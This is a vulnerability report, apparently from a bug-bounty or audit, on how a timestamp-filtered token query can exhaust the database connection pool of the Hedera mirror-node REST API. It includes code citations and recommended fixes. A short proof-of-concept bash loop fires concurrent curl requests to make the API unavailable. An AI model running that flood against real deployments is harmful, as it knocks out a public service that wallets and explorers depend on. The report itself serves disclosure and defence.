### Title
Unauthenticated DB Connection Pool Exhaustion via Timestamp-Triggered History Table Fan-Out in `GET /api/v1/tokens/{tokenId}`

### Summary
When an unprivileged caller supplies any `timestamp` filter to `GET /api/v1/tokens/{tokenId}`, `extractSqlFromTokenInfoRequest()` unconditionally invokes `buildHistoryQuery()` three times, each of which emits a `UNION ALL` between a live table and its `_history` counterpart, producing six sequential table scans per request. Because the REST API carries no rate-limiting middleware and the default connection pool is capped at ten connections with a 20-second statement timeout, a small number of concurrent requests is sufficient to hold every pool slot for the full timeout window, rendering the mirror-node REST API completely unresponsive to legitimate traffic.

### Finding Description

**Exact code path**

`rest/tokens.js` — `extractSqlFromTokenInfoRequest()` (lines 482–528):

```js
if (filters && filters.length !== 0) {
  const filter = filters[filters.length - 1];
  const op = transformTimestampFilterOp(filter.operator);
  const conditions = [`${CustomFee.ENTITY_ID} = $1`,
                      `lower(${CustomFee.TIMESTAMP_RANGE}) ${op} $2`];
  params.push(filter.value);
  var conditionsSql = conditions.join(' and ');

  tokenQuery     = buildHistoryQuery(tokenSelectFields,
                     conditionsSql.replace('entity_id','token_id'),
                     Token.tableName, Token.tableAlias);          // scan 1+2

  entityQuery    = buildHistoryQuery(entitySelectFields,
                     conditionsSql.replace('entity_id','id'),
                     Entity.tableName, Entity.tableAlias);        // scan 3+4

  customFeeQuery = buildHistoryQuery(customFeeSelectFields,
                     conditionsSql,
                     CustomFee.tableName, CustomFee.tableAlias);  // scan 5+6
}
```

`buildHistoryQuery()` (lines 530–546) always emits:

```sql
(SELECT … FROM <table>         WHERE <conditions>)
UNION ALL
(SELECT … FROM <table>_history WHERE <conditions>
   ORDER BY lower(timestamp_range) DESC LIMIT 1)
ORDER BY modified_timestamp DESC LIMIT 1
```

Two full index/sequential scans per call × three calls = **six table scans per request**.

**Root cause and failed assumption**

The design assumes the DB pool's `statementTimeout` (default 20 s) and `maxConnections` (default 10) are sufficient back-pressure. They are not: an attacker can hold all ten connections for up to 20 seconds each with a single wave of requests, and there is **zero rate-limiting middleware** in the REST API stack (`rest/server.js` registers no throttle layer; `grep` across `rest/**/*.js` for `rateLimit`, `throttle`, or `rate_limit` returns no matches).

**Why input validation does not help**

`validateTokenInfoFilter()` (lines 451–463) correctly rejects invalid operators and malformed timestamps, but a well-formed `lte:<valid_timestamp>` passes all checks and still triggers the six-scan query. The expensive path is the intended code path for historical queries.

### Impact Explanation

With the default pool of 10 connections and a 20-second statement timeout, an attacker needs only 10 concurrent HTTP requests to saturate the pool for up to 20 seconds. During that window every other API call (accounts, transactions, balances, etc.) that requires a DB connection will queue and eventually time out with a connection-acquisition error, making the entire mirror-node REST API unavailable. Because the mirror node is the primary read interface for wallets, explorers, and dApps querying Hedera state, this constitutes a denial-of-service against the mirror node's processing capacity.

### Likelihood Explanation

- **No authentication or API key required** — the endpoint is fully public.
- **No rate limiting** — confirmed absent from `rest/server.js` and all REST middleware files.
- **Trivially scriptable** — a single `ab -n 50 -c 10` or equivalent curl loop is sufficient.
- **Repeatable** — after the statement timeout expires the attacker simply re-sends the wave; the pool never recovers under sustained load.
- **Low attacker sophistication** — requires only knowledge of a valid token ID (enumerable from `GET /api/v1/tokens`) and a valid timestamp string.

### Recommendation

1. **Add rate limiting at the REST API layer** — introduce a middleware such as `express-rate-limit` (or an upstream proxy rule) scoped to the `/api/v1/tokens/:tokenId` route, limiting requests per IP per second.
2. **Reduce `statementTimeout`** for the historical-query path, or set a shorter per-query timeout specifically for history-table fan-out queries.
3. **Increase `maxConnections`** or deploy a connection pooler (e.g., PgBouncer) so that pool exhaustion does not cascade to all other endpoints.
4. **Consider caching** historical token-info responses (the timestamp value is immutable once past), so repeated identical queries are served from cache rather than hitting the DB.

### Proof of Concept

```bash
# 1. Obtain any valid token ID
TOKEN=$(curl -s https://<mirror-node>/api/v1/tokens?limit=1 \
        | jq -r '.tokens[0].token_id')

# 2. Fire 10 concurrent requests with a timestamp filter
#    Each holds a DB connection for up to 20 s (statementTimeout)
for i in $(seq 1 10); do
  curl -s "https://<mirror-node>/api/v1/tokens/${TOKEN}?timestamp=lte:9999999999.999999999" &
done
wait

# 3. While the above are in-flight, observe that all other API calls fail:
curl -v "https://<mirror-node>/api/v1/accounts/0.0.1"
# Expected: connection timeout / 503 / hanging response
# because all 10 pool slots are occupied
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rest/tokens.js (L482-528)
```javascript
const extractSqlFromTokenInfoRequest = (tokenId, filters) => {
  const params = [tokenId];
  let tokenQuery = 'token';
  let entityQuery = 'entity';
  let customFeeQuery = 'custom_fee';

  if (filters && filters.length !== 0) {
    // honor the last timestamp filter
    const filter = filters[filters.length - 1];
    const op = transformTimestampFilterOp(filter.operator);
    const conditions = [`${CustomFee.ENTITY_ID} = $1`, `lower(${CustomFee.TIMESTAMP_RANGE}) ${op} $2`];
    params.push(filter.value);

    var conditionsSql = conditions.join(' and ');

    // include the history table in the query
    tokenQuery = buildHistoryQuery(
      tokenSelectFields,
      conditionsSql.replace('entity_id', 'token_id'),
      Token.tableName,
      Token.tableAlias
    );

    entityQuery = buildHistoryQuery(
      entitySelectFields,
      conditionsSql.replace('entity_id', 'id'),
      Entity.tableName,
      Entity.tableAlias
    );

    customFeeQuery = buildHistoryQuery(customFeeSelectFields, conditionsSql, CustomFee.tableName, CustomFee.tableAlias);
  }

  var query = `${tokenInfoOuterSelect}
            from ${tokenQuery} as ${Token.tableAlias}
            join ${entityQuery} as ${Entity.tableAlias} on ${Entity.getFullName(Entity.ID)} = ${Token.getFullName(
    Token.TOKEN_ID
  )}
            left join ${customFeeQuery} as ${CustomFee.tableAlias} on 
                 ${CustomFee.getFullName(CustomFee.ENTITY_ID)} = ${Token.getFullName(Token.TOKEN_ID)}
            ${tokenIdMatchQuery}`;

  return {
    query,
    params,
  };
};
```

**File:** rest/tokens.js (L530-546)
```javascript
const buildHistoryQuery = (selectColumns, conditions, tableName, tableAlias) => {
  return `
   (select ${selectColumns}
    from
    (
      (select ${selectColumns}, lower(${tableAlias}.timestamp_range) as modified_timestamp
        from ${tableName} ${tableAlias}
        where ${conditions})
      union all
      (select ${selectColumns}, lower(${tableAlias}.timestamp_range) as modified_timestamp
      from ${tableName}_history ${tableAlias}
        where ${conditions} 
        order by lower(${tableAlias}.timestamp_range) desc limit 1)
      order by modified_timestamp desc limit 1
    ) as ${tableAlias})
    `;
};
```

**File:** rest/tokens.js (L1086-1086)
```javascript
const acceptedSingleTokenParameters = new Set([filterKeys.TIMESTAMP]);
```

**File:** rest/dbpool.js (L7-16)
```javascript
const poolConfig = {
  user: config.db.username,
  host: config.db.host,
  database: config.db.name,
  password: config.db.password,
  port: config.db.port,
  connectionTimeoutMillis: config.db.pool.connectionTimeout,
  max: config.db.pool.maxConnections,
  statement_timeout: config.db.pool.statementTimeout,
};
```

**File:** rest/server.js (L67-98)
```javascript
// middleware functions, Prior to v0.5 define after sets
app.use(
  express.urlencoded({
    extended: false,
  })
);
app.use(express.json());
app.use(cors());

if (config.response.compression) {
  logger.info('Response compression is enabled');
  app.use(compression());
}

// logging middleware
app.use(httpContext.middleware);
app.useExt(requestLogger);

// authentication middleware - must come after httpContext and requestLogger
app.useExt(authHandler);

// metrics middleware
if (config.metrics.enabled) {
  const {metricsHandler} = await import('./middleware/metricsHandler');
  app.useExt(metricsHandler());
}

// Check for cached response
if (applicationCacheEnabled) {
  logger.info('Response caching is enabled');
  app.useExt(responseCacheCheckHandler);
}
```
